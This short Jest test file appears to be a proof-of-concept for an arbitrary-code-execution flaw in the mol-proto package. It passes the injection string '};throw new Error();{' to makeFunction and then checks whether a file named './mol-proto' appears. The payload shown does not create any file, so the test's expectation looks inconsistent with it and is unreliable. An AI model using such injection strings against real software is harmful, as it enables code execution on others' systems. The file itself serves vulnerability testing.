test("Arbitrary code execution in mol-proto", () => {
  expect.assertions(2);
  const fs = require("fs");
  const mp = require("mol-proto");
  const path = "./mol-proto";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mp.makeFunction(
      "a",
      "b",
      "};throw new Error();{"
    );
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
